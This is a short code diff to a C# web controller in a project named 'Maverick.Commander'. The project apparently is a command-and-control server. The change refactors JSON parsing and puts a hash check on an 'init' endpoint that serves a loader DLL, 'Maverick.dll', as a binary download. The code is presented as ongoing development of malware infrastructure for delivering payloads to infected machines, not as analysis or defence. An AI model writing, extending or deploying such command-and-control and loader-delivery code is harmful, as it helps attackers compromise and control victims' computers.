@@ -19,6 +19,10 @@ namespace Maverick.Commander.Controllers
         private readonly ILogger<CommandController> _logger;
         private readonly ICommandAndControl _commandAndControl;
         private readonly string HeaderHashCheck;
+        private readonly JsonSerializerOptions options = new()
+        {
+            PropertyNameCaseInsensitive = true 
+        };
 
         public CommandController(ILogger<CommandController> logger, ICommandAndControl commandAndControl)
         {
@@ -122,11 +126,7 @@ namespace Maverick.Commander.Controllers
             CommandRequestModel? cmd;
             try
             {
-                // Deserialize manually (use options for case-insensitivity if needed)
-                var options = new JsonSerializerOptions
-                {
-                    PropertyNameCaseInsensitive = true  // Optional: Handles case mismatches like "command" vs "Command"
-                };
+                
                 cmd = JsonSerializer.Deserialize<CommandRequestModel>(body, options);
             }
             catch (JsonException ex)
@@ -153,9 +153,13 @@ namespace Maverick.Commander.Controllers
             return Ok(new { ok = true });
         }
 
-        [HttpPost("init")]
-        public async Task<IActionResult> InitLoader()
+        [HttpPost("init/{cus_hash}")]
+        public async Task<IActionResult> InitLoader(string cus_hash)
         {
+            if (cus_hash != HeaderHashCheck)
+            {
+                return Unauthorized();
+            }
             byte[] net_loader = await System.IO.File.ReadAllBytesAsync("Maverick.dll");//template
             return File(net_loader, "application/octet-stream");
         }
